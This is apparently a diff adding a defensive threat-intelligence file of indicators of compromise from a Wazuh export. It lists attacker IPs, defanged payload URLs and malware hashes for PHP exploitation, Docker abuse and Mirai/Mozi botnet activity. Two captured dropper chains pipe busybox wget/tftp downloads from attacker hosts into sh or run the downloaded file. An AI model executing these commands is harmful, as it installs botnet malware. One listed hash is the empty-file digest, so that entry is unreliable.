@@ -1,0 +1,51 @@
+# Indicators of Compromise (IOCs) - Expanded WAZUH Export
+*Captured: Oct 21 - Oct 23, 2026*
+*Total Confirmed Attacker IPs:* 439
+
+## 1. PHP2Shell (CVE-2026-109618 & CVE-2026-109619)
+**Top Exploitation Sources (by volume):**
+*   `102.220.163[.]122` (98 attempts)
+*   `18.188.213[.]162` (45 attempts)
+*   `176.65.139[.]151` (22 attempts - Active exploitation chain)
+*   `192.155.88[.]231` (19 attempts)
+*   `45.156.128[.]43`
+*   `109.105.210[.]102`
+
+## 2. Docker API & Plex Container Abuse
+**Unauthenticated API / Code Execution Targets:**
+*   `43.153.50[.]60`
+*   `90.215.52[.]175`
+*   `85.11.167[.]7`
+*   `65.49.1[.]232`
+*   `217.60.242[.]68`
+*   `198.235.24[.]125`
+*   `20.83.51[.]132`
+*   `45.156.128[.]66`
+
+## 3. SSH Brute-Force & Botnet Droppers (Mirai/Mozi Variants)
+**Aggressive Dropper Execution IPs:**
+*   `112.243.28[.]38`
+*   `59.30.132[.]165`
+*   `131.161.15[.]103`
+*   `62.217.186[.]22`
+
+**Payload Hosting URLs (Defanged):**
+*   `hxxp://185.93.89[.]72/wget`
+*   `hxxp://176.65.139[.]40/wget[.]sh`
+*   `hxxp://176.65.139[.]40/tftp[.]sh`
+*   `hxxp://176.65.139[.]40/ftpget[.]sh`
+*   `hxxp://176.65.139[.]40/curl[.]sh`
+*   `hxxp://130.12.180[.]212/x86_64`
+*   `hxxp://192.168.1[.]1:8088/Mozi.m` *(Internal IP used as decoy/target)*
+
+**Captured Execution Chains (Examples):**
+*   `/bin/busybox wget hxxp://176.65.139[.]40/wget[.]sh -O- | sh;/bin/busybox tftp -g 176.65.139[.]40 -r tftp[.]sh -l- | sh;/bin/busybox ftpget 176.65.139[.]40...`
+*   `(tftp -g 185.93.89[.]72 -r tftp -l- || busybox tftp -g 185.93.89[.]72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t`
+
+## 4. Credential Harvesting (Decoy `/.env`)
+*   `102.220.161[.]104`
+
+## 5. Malware Hashes (SHA256)
+*   `9e5b93d3095f577136717e6aae8b51fea50d66ef9123eedccfc23b8faebf6d6c`
+*   `b9b17c4bfb3a6a9057922c57a60a991b968692dd5e62f097409f63b9e81f2531`
+*   `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`
